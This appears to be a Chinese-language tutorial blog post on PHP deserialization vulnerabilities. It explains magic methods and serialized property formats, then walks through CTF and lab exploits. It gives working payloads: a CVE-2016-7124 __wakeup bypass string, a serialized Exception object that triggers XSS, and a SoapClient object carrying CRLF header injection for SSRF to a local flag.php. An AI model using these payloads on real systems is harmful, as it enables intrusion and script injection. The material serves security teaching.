![1647570632090-403ac5da-cdd1-47b2-b674-f714c0139e19.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913104239756-1478084683.png)

```plain
#知识点：
1、反序列化魔术方法全解
2、反序列化变量属性全解
3、反序列化魔术方法原生类
4、反序列化语言特性漏洞绕过
-其他魔术方法 
-共有&私有&保护 
-语言模式方法漏洞 
-原生类获取利用配合

#反序列化利用大概分类三类
-魔术方法的调用逻辑-如触发条件
-语言原生类的调用逻辑-如SoapClient
-语言自身的安全缺陷-如CVE-2016-7124

#反序列化课程点：
-PHP&Java&Python

序列化：对象转换为数组或字符串等格式
反序列化：将数组或字符串等格式转换成对象
serialize()     //将一个对象转换成一个字符串
unserialize()   //将字符串还原成一个对象

#PHP反序列化漏洞
原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。

#魔术方法利用点分析：
触发：unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法：
__construct(): //构造函数，当对象new的时候会自动调用
__destruct()：//析构函数当对象被销毁时会被自动调用
__wakeup(): //unserialize()时会被自动调用
__invoke(): //当尝试以调用函数的方法调用一个对象时，会被自动调用
__call(): //在对象上下文中调用不可访问的方法时触发
__callStatci(): //在静态上下文中调用不可访问的方法时触发
__get(): //用于从不可访问的属性读取数据
__set(): //用于将数据写入不可访问的属性
__isset(): //在不可访问的属性上调用isset()或empty()触发
__unset(): //在不可访问的属性上使用unset()时触发
__toString(): //把类当作字符串使用时触发
__sleep(): //serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用
```

- 方法&属性-调用详解&变量数据详解

------

__construct __destruct 魔术方法 创建调用__construct 2种销毁调用__destruct

```plain
class Test{
    public $name;
    public $age;
    public $string;
    // __construct：实例化对象时被调用.其作用是拿来初始化一些值。
    public function __construct($name, $age, $string){
        echo "__construct 初始化"."<br>";
        $this->name = $name;
        $this->age = $age;
        $this->string = $string;
    }
    // __destruct：当删除一个对象或对象操作终止时被调用。其最主要的作用是拿来做垃圾回收机制。
    /*
     * 当对象销毁时会调用此方法
     * 一是用户主动销毁对象，二是当程序结束时由引擎自动销毁
     */
   function __destruct(){
       echo "__destruct 类执行完毕"."<br>";
    }
}


// 主动销毁
$test = new Test("Spaceman",566, 'Test String');
unset($test);
echo '第一种执行完毕'.'<br>';//先调用，在执行

输出：__construct 初始化    __destruct 类执行完毕     第一种执行完毕（先执行销毁，然后在执行echo内容，这个是主动销毁）



// 程序结束自动销毁
$test = new test("Spaceman",566, 'Test String');
echo '第二种执行完毕'.'<br>';

输出：__construct 初始化   第二种执行完毕     __destruct 类执行完毕（先执行echo内容，程序执行完成后销毁）
```

__toString()：在对象当做字符串的时候会被调用

```plain
class Test
{
    public $variable = 'This is a string';

    public function good(){
        echo $this->variable . '<br />';
    }

    // 在对象当做字符串的时候会被调用
    public function __toString()
{
        return '__toString <br>';
    }
}



$a = new Test();
$a->good();//调用了good函数

echo $a;//把类当成字符串进行输出

输出：This is a string   __toString
```

__CALL 魔术方法 调用某个方法， 若方法存在，则直接调用；若不存在，则会去调用__call函数。

```plain
class Test{

    public function good($number,$string){
        echo '存在good方法'.'<br>';
        echo $number.'---------'.$string.'<br>';
    }

    // 当调用类中不存在的方法时，就会调用__call();
    public function __call($method,$args){
        echo '不存在'.$method.'方法'.'<br>';
        var_dump($args);
    }
}

$a = new Test();
$a->good(566,'nice');
输出：存在good方法   566---------nice（没有调用__call方法）

$b = new Test();
$b->spaceman(899,'no');
输出：不存在spaceman方法   array(2) { [0]=> int(899) [1]=> string(2) "no" }（调用了__call方法）
```

__get() 魔术方法 读取一个对象的属性时，若属性存在，则直接返回属性值；若不存在，则会调用__get函数

```plain
class Test {
    public $n=123;

    // __get()：访问不存在的成员变量时调用
    public function __get($name){
        echo '__get 不存在成员变量'.$name.'<br>';
    }
}

$a = new Test();
// 存在成员变量n，所以不调用__get
echo $a->n;
输出：123

echo '<br>';
// 不存在成员变量spaceman，所以调用__get
echo $a->spaceman;
输出：__get 不存在成员变量spaceman
```

__set()魔术方法 设置一个对象的属性时， 若属性存在，则直接赋值；若不存在，则会调用__set函数。

```plain
class Test{
    public $data = 100;
    protected $noway=0;

    // __set()：设置对象不存在的属性或无法访问(私有)的属性时调用
    /* __set($name, $value)
     * 用来为私有成员属性设置的值
     * 第一个参数为你要为设置值的属性名，第二个参数是要给属性设置的值，没有返回值。
     
    public function __set($name,$value){
        echo '__set 不存在成员变量 '.$name.'<br>';
        echo '即将设置的值 '.$value."<br>";
        $this->noway=$value;
    }

    public function Get(){
        echo $this->noway;
    }
}

$a = new Test();
// 读取 noway 的值，初始为0
$a->Get();
输出：0（初始值）


echo '<br>';
// 无法访问(私有)noway属性时调用，并设置值为899
$a->noway  = 899;
// 经过__set方法的设置noway的值为899
$a->Get();
输出：__set 不存在成员变量 noway    即将设置的值 899    899



echo '<br>';
// 设置对象不存在的属性spaceman
$a->spaceman = 566;
// 经过__set方法的设置noway的值为566
$a->Get();
输出：__set 不存在成员变量 spaceman    即将设置的值 566    566
```

__sleep()：serialize之前被调用，可以指定要序列化的对象属性。

```plain
class Test{
    public $name;
    public $age;
    public $string;

    // __construct：实例化对象时被调用.其作用是拿来初始化一些值。
    public function __construct($name, $age, $string){
        echo "__construct 初始化"."<br>";
        $this->name = $name;
        $this->age = $age;
        $this->string = $string;
    }

    //  __sleep() ：serialize之前被调用，可以指定要序列化的对象属性
    public function __sleep(){
        echo "当在类外部使用serialize()时会调用这里的__sleep()方法<br>";
        // 例如指定只需要 name 和 age 进行序列化，必须返回一个数值
        return array('name', 'age');
    }
}


$a = new Test("Spaceman",566, 'Test String');
echo serialize($a);
输出：__construct 初始化   当在类外部使用serialize()时会调用这里的__sleep()方法     O:4:"Test":2:{s:4:"name";s:8:"Spaceman";s:3:"age";i:566;}
```

__wakeup：反序列化恢复对象之前调用该方法

```plain
class Test{
    public $sex;
    public $name;
    public $age;

    public function __construct($name, $age, $sex){
        $this->name = $name;
        $this->age = $age;
        $this->sex = $sex;
    }

    public function __wakeup(){
        echo "当在类外部使用unserialize()时会调用这里的__wakeup()方法<br>";
        $this->age = 566;
    }
}

$person = new Test('spaceman',21,'男');
$a = serialize($person);
echo $a."<br>";
var_dump (unserialize($a));
输出：O:4:"Test":3:{s:3:"sex";s:3:"男";s:4:"name";s:8:"spaceman";s:3:"age";i:21;}     当在类外部使用unserialize()时会调用这里的__wakeup()方法      object(Test)#2 (3) { ["sex"]=> string(3) "男" ["name"]=> string(8) "spaceman" ["age"]=> int(566) }
```

__isset(): 检测对象的某个属性是否存在时执行此函数。当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用

```plain
class Person{
    public $sex;
    private $name;
    private $age;

    public function __construct($name, $age, $sex){
        $this->name = $name;
        $this->age = $age;
        $this->sex = $sex;
    }

    // __isset()：当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。
    public function __isset($content){
        echo "当在类外部使用isset()函数测定私有成员 {$content} 时，自动调用<br>";
        return isset($this->$content);
    }
}

$person = new Person("spaceman", 25,'男');
// public 成员
echo ($person->sex),"<br>";
// private 成员
echo isset($person->name);

输出：男   当在类外部使用isset()函数测定私有成员 name 时，自动调用   1
```

__unset()：在不可访问的属性上使用unset()时触发 销毁对象的某个属性时执行此函数

```plain
class Person{
    public $sex;
    private $name;
    private $age;

    public function __construct($name, $age, $sex){
        $this->name = $name;
        $this->age = $age;
        $this->sex = $sex;
    }

    // __unset()：销毁对象的某个属性时执行此函数
    public function __unset($content) {
        echo "当在类外部使用unset()函数来删除私有成员时自动调用的<br>";
        echo isset($this->$content)."<br>";
    }
}

$person = new Person("spaceman", 21,"男"); // 初始赋值
echo "666666<br>";
unset($person->name);//调用 属性私有
输出：当在类外部使用unset()函数来删除私有成员时自动调用的

unset($person->age);//调用 属性私有
输出：当在类外部使用unset()函数来删除私有成员时自动调用的

unset($person->sex);//不调用 属性共有
没有任何输出
```

__INVOKE():将对象当做函数来使用时执行此方法，通常不推荐这样做。

```plain
class Test{
    // _invoke()：以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用
    public function __invoke($param1, $param2, $param3)
{
        echo "这是一个对象<br>";
        var_dump($param1,$param2,$param3);
    }
}

$a  = new Test();
$a('spaceman',21,'男');
输出错误。应该是环境有要求
```

对象变量属性

```plain
public(公共的):在本类内部、外部类、子类都可以访问
protect(受保护的):只有本类或子类或父类中可以访问
private(私人的):只有本类内部可以使用
序列化数据显示：
private属性序列化的时候格式：%00类名%00成员名
protect属性序列化的时候格式：%00*%00成员名

class test{
    public $name="xiaodi";
    private $age="29";
    protected $sex="man";
}
$a=new test();
$a=serialize($a);
print_r($a);

输出：O:4:"test":3:{s:4:"name";s:6:"xiaodi";s:9:"testage";s:2:"29";s:6:"*sex";s:3:"man";}
testage为：%00test%00age       *sex为：%00*%00sex
```

- CTF-语言漏洞-__wakeup()方法绕过

------

```plain
 [极客大挑战 2019]PHP CVE-2016-7124 靶场：https://buuoj.cn/challenges
如果存在__wakeup方法，调用unserilize()方法前则先调用__wakeup方法，
但是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行
1、下载源码分析，触发flag条件
2、分析会触发调用__wakeup 强制username值
3、利用语言漏洞绕过 CVE-2016-7124
4、构造payload后 修改满足漏洞条件触发



扫描得到www.zip文件，下载查看源代码

在index.php中发现接受和包含代码：
    <?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?>
有unserialize反序列化操作。



在class文件中代码：
<?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>

分析代码：
在哪里能触发出flag来，在__destruct魔术方法中，并且要username==='admin'才能得到flag，在构造poc链的时候强制性把username改成admin，但是用到unserialize这个函数，就一定会触发__wakeup代码，那么就会把username强制转化为guest

那么怎么绕过__wokeup这个函数呢？参考 CVE-2016-7124这个漏洞。参考https://www.cnblogs.com/zy-king-karl/p/11436872.html

如果存在__wakeup方法，调用 unserilize() 方法前则先调用__wakeup方法，但是序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行

构造payload：
<?php
class Name
{
    private $username = 'admin';
    private $password = '100';
}
$a = new Name();
echo urlencode(serialize($a));
?>

生成poc：
O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D

修改个数：
O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D

构造payload：?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D
```

- CTF-方法原生类-获取&利用&配合其他

------

```plain
参考案例：https://www.anquanke.com/post/id/264823
-PHP有那些原生类-见脚本使用
-常见使用的原生类-见参考案例
-原生类该怎么使用-见官方说明
0、生成原生类
<?php
$classes = get_declared_classes();
foreach ($classes as $class) {
    $methods = get_class_methods($class);
    foreach ($methods as $method) {
        if (in_array($method, array(
            '__destruct',
            '__toString',
            '__wakeup',
            '__call',
            '__callStatic',
            '__get',
            '__set',
            '__isset',
            '__unset',
            '__invoke',
            '__set_state'
        ))) {
            print $class . '::' . $method . "\n";
        }
    }
} 

访问http://127.0.0.1:8081/web/ctfshow/yslhq.php 就可以得到原生类
```

![1647581343739-0800aca2-aa79-40d4-a544-d78645b03fd7.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913104352996-569613873.png)

```plain
1、本地Demo-xss
<?php
highlight_file(__file__);
$a = unserialize($_GET['k']);
echo $a;
?>
-输出对象可调用__toString
-无代码通过原生类Exception
-Exception使用查询编写利用
-通过访问触发输出产生XSS漏洞

访问view-source:http://127.0.0.1:8081/web/ctfshow/yslhq.php，获取__toString的魔术方法的原生类
```

![1647581973041-35a3195e-239e-46d8-b6c8-6a6b2ac1c0f0.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913104352654-279197032.png)

```plain
搜索Exception的用法：https://www.php.net/manual/zh/class.exception.php
发现符合xss漏洞产生
```

![1647582382587-23378590-1a32-40f4-8cbb-f394e7e6ff64.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913104352483-1045891266.png)

```plain
那么应该怎么执行触发呢？
构造payload：
<?php
$a=new Exception("<script>alert('xiaodi')</script>");
echo urlencode(serialize($a));
?>

生成payload：O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A32%3A%22%3Cscript%3Ealert%28%27xiaodi%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A15%3A%22%2Fbox%2Fscript.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D

执行，弹窗：http://127.0.0.1:8081/web/ctfshow/ctf-xss.php?k=O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A32%3A%22%3Cscript%3Ealert%28%27xiaodi%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A15%3A%22%2Fbox%2Fscript.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
2、CTFSHOW-259
-不存在的方法触发__call
-无代码通过原生类SoapClient
-SoapClient使用查询编写利用
-通过访问本地Flag.php获取Flag
<?php
$ua="aaa\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow";
$client=new SoapClient(null,array('uri'=>'http://127.0.0.1/','location'=>'http://127.0.0.1/flag.php','user_agent'=>$ua));
echo urlencode(serialize($client));
?>
```